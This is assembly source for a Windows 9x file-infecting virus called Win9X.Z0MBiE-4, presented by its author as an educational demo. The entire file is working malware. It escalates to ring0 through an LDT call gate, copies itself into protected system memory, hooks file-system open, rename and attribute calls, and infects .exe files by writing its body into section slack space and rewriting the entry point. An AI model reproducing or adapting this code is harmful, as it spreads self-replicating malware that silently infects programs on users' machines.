   ; Win9X.Z0MBiE-4 (.848)
   ;
   ; this is very simple demo-virus, for educational purposes.
   ; without complex stuff/etc.
   ;
   ; - PE infector (1st section alignment)
   ; - ring0-resident via LDT
   ; - i-am-here function using io callback
   ;
   ;                                                      http://z0mbie.cjb.net

   ;DEBUG                  equ     ?    ; will infect only .Z0M files if defined

   include                 z0mbie4.inc

                           p386
                           model   flat

                           locals  __

                           .code
   start:
                           pusha

   ; install SEH

                           call    __pop1

                           mov     esp, [esp+8]
                           jmp     __exit

   __pop1:                 xor     eax, eax
                           push    dword ptr fs:[eax]
                           mov     fs:[eax], esp

   ; check if alredy resident

                           mov     dx, 8888h
                           in      al, dx
                           cmp     al, dl
                           je      __exit

   ; get address of ring0 callgate handler

                           call    __pop2

   ; ring0 callgate handler
                           pusha
                           call    install_ring0_stuff
                           popa

                           retf                    ; retf !

   __pop2:                 pop     esi             ; ESI <-- ring0 proc

                           push    ebx             ; EBX <-- GDT base
                           sgdt    [esp-2]
                           pop     ebx

                           sldt    ax              ; EAX <- LDT selector (#*8)
                           and     al, 11111000b
                           jz      __exit          ; no LDT?

                           add     ebx, eax        ; EBX <-- LDT descriptor offs

                           mov     edi, [ebx+2-2]  ; EDI <-- LDT.base
                           mov     ah, [ebx+7]
                           mov     al, [ebx+4]
                           shrd    edi, eax, 16

                           fild    qword ptr [edi] ; save descriptor (#0)

                           mov     eax, esi        ; build CallGate
                           cld
                           stosw
                           mov     eax, 1110110000000000b shl 16 + 28h
                           stosd
                           shld    eax, esi, 16
                           stosw

                           db      9Ah             ; call 28:<esi>
                           dd      0               ; unused, any number
                           dw      100b+11b        ; #0, LDT+R3

                           fistp   qword ptr [edi-8]; restore descriptor

   ; uninstall SEH

   __exit:                 pop     dword ptr fs:[0]
                           pop     eax

                           popa

   ; return to host
                           db      0E9h
   old_eip                 dd      rt-$-4

   get_base_ebp:           call    $+5
                           pop     ebp
                           sub     ebp, offset $-1-start
   rt:                     ret

   install_ring0_stuff:

   ; allocate memory
                           push    PAGEFIXED + PAGEZEROINIT
                           xor     eax, eax
                           push    eax     ; PhysAddr
                           push    eax     ; maxPhys
                           push    eax     ; minPhys
                           push    eax     ; Align
                           push    eax     ; handle of VM = 0 if PG_SYS
                           push    PG_SYS  ; allocate memory in system area
                           push    virpages; nPages
   restvxdc:               VMMcall PageAllocate
                           add     esp, 8*4

                           test    eax, eax
                           jz      __exit

   ; copy virus to new location

                           call    get_base_ebp
                           mov     esi, ebp
                           xchg    ebp, eax                ; EBP=new location!
                           mov     edi, ebp
                           mov     ecx, virsize
                           cld
                           rep     movsb

   ; fill uninitialized data with 0s

                           mov     ecx, udatasize
                           xor     eax, eax
                           rep     stosb

   ; make virus's copy -- all files will be infected with this copy.
   ; we need it because VxDcalls (CD 20 xxx) will be converted to direct CALLs

                           mov     esi, ebp
                           lea     edi, vircopy x
                           mov     ecx, virsize
                           rep     movsb

                           ; restore previously converted VxDcall
                           lea     edi, (restvxdc-start) + vircopy x
                           mov     ax, 20CDh
                           stosw
                           mov     eax, VMM shl 16 + PageAllocate
                           stosd

   ; protect memory from ring3-access

                           mov     eax, ebp
                           shr     eax, 12

                           push    PC_STATIC                       ; OR_MASK
                           push    not (PC_WRITEABLE+PC_USER)      ; AND_MASK
                           push    virpages
                           push    eax
                           VMMcall PageModifyPermissions
                           add     esp, 4*4

   ; install file system handler

                           lea     eax, ifs_handler x
                           push    eax
                           VxDcall IFSMGR, InstallFileSystemApiHook
                           pop     ecx
                           mov     old_ifs_handler_ptr_ptr x, eax

   ; install io service to provide i-am-here function

                           lea     esi, iocallback x
                           mov     edx, 8888h
                           VMMcall Install_IO_Handler

   ; done

   __exit:                 ret

   ; io handler

   iocallback:             cmp     edx, 8888h
                           jne     __exit
                           mov     al, dl
   __exit:                 ret

   ; IFS handler

   ifs_handler:            push    ebp

                           call    get_base_ebp

                           cmp     ifs_handler_entered x, 0
                           jne     __quit
                           inc     ifs_handler_entered x

                           mov     eax, [esp]._function

                           cmp     eax, IFSFN_OPEN
                           je      __my_func
                           cmp     eax, IFSFN_RENAME
                           je      __my_func
                           cmp     eax, IFSFN_FILEATTRIB
                           je      __my_func

   __exit:                 dec     ifs_handler_entered x

   __quit:                 mov     eax, old_ifs_handler_ptr_ptr x
                           pop     ebp
                           jmp     [eax]

   ; IFSFN_xxx handler

   __my_func:              pusha

                           lea     edi, filename x
                           cld

                           mov     eax, [esp]._drive + 32

                           or      al, al
                           jle     __skip

   ; build file name
                           add     al, 'A'-1
                           stosb
                           mov     al, ':'
                           stosb

                           mov     eax, [esp]._ioreq_ptr + 32
                           mov     eax, [eax+0Ch]  ; eax <-- filename
                           add     eax, 4          ; skip "

                           push    [esp]._codepage+32 ; BCS_WANSI/BCS_OEM
                           push    MAXPATH-1       ; max name length
                           push    eax             ; uni-str
                           push    edi             ; output-str
                           VxDcall IFSMGR, UniToBCSPath
                           add     esp, 4*4

                           or      edx, edx        ; converted normally?
                           jnz     __skip

                           mov     [edi+eax], dl   ; NUL

                           call    infect_file

   __skip:                 popa
                           jmp     __exit

   ; file infection subroutine
   ; input: filename variable

   infect_file:            pusha

                           call    get_base_ebp

   ; check file extension
                           lea     edi, filename x
                           mov     ecx, MAXPATH
                           xor     al, al
                           cld
                           repnz   scasb
                           mov     eax, [edi-5]
                           or      eax, 20202000h
           IFDEF   DEBUG
                           cmp     eax, 'm0z.'
           ELSE
                           cmp     eax, 'exe.'
           ENDIF
                           jne     __exit

   ; open file
                           lea     edx, filename x
                           call    fopen
                           jc      __exit
                           xchg    ebx, eax

                           xor     esi, esi      ; esi = offset for fread/fwrite

   ; process mz header
                           lea     edx, mz x
                           mov     ecx, size mz
                           call    fread
                           cmp     eax, ecx
                           jne     __close

                           cmp     mz.mz_id x, 'ZM'
                           jne     __close

   ; process pe header
                           mov     esi, mz.mz_neptr x

                           lea     edx, pe x
                           mov     ecx, size pe
                           call    fread
                           cmp     eax, ecx
                           jne     __close

                           cmp     pe.pe_id x, 'EP'
                           jne     __close

   ; read 1st object entry
                           add     esi, ecx

                           lea     edx, oe x
                           mov     ecx, size oe
                           call    fread

   ; align 1st section virtual/physical sizes

                           mov     eax, oe.oe_phys_size x
                           mov     ecx, pe.pe_filealign x
                           dec     ecx
                           add     eax, ecx
                           not     ecx
                           and     eax, ecx
                           mov     oe.oe_phys_size x, eax

                           mov     eax, oe.oe_virt_size x
                           mov     ecx, pe.pe_objectalign x
                           dec     ecx
                           add     eax, ecx
                           not     ecx
                           and     eax, ecx
                           mov     oe.oe_virt_size x, eax

   ; esi <-- our file offset

                           mov     esi, oe.oe_phys_offs x
                           add     esi, oe.oe_phys_size x
                           sub     esi, virsize

   ; read temporary buffer

                           lea     edx, tempbuf x
                           mov     ecx, virsize
                           call    fread

   ; check buffer -- should be empty (0s)

                           mov     edi, edx
                           xor     eax, eax
                           cld
                           repz    scasb
                           jnz     __close

   ; process entrypointrva

                           mov     ecx, esi                ; ecx <-- new rva
                           sub     ecx, oe.oe_phys_offs x
                           add     ecx, oe.oe_virt_rva x

                           lea     eax, [ecx + old_eip+4-start]

                           xchg    ecx, pe.pe_entrypointrva x   ; swap old/new
                           jecxz   __close

                           sub     ecx, eax              ; calc old_eip (for E9)
                           mov     (vircopy-start) + old_eip x, ecx

   ; write virus to file

                           lea     edx, vircopy x
                           mov     ecx, virsize
                           call    fwrite

   ; write modified pe header/1st objentry to file

                           mov     esi, mz.mz_neptr x

                           lea     edx, pe x
                           mov     ecx, size pe + size oe
                           call    fwrite

   ; close file/exit

   __close:                call    fclose

   __exit:                 popa
                           ret

                           db      'Z0MBiE-4'

   include                 r0io.inc                ; ring-0 file io

                           align   16
   codeend:
   virsize                 equ     codeend-start

   old_ifs_handler_ptr_ptr dd      ?
   ifs_handler_entered     db      ?

   MAXPATH                 equ     260
   filename                db      MAXPATH dup (?)

   mz                      mz_struc ?
   pe                      pe_struc ?
   oe                      oe_struc ?

   vircopy                 db      virsize dup (?)
   tempbuf                 db      virsize dup (?)

   udatasize               equ     $-codeend
   virpages                equ     ($-start+4095)/4096

                           db      3 dup (13,10)
                           db      'virsize  = '
                           db      virsize/1000 mod 10 + '0'
                           db      virsize/ 100 mod 10 + '0'
                           db      virsize/  10 mod 10 + '0'
                           db      virsize/   1 mod 10 + '0'
                           db      13,10
                           db      'virpages = '
                           db      virpages/1000 mod 10 + '0'
                           db      virpages/ 100 mod 10 + '0'
                           db      virpages/  10 mod 10 + '0'
                           db      virpages/   1 mod 10 + '0'
                           db      13,10
                           db      3 dup (13,10)

                           end     start
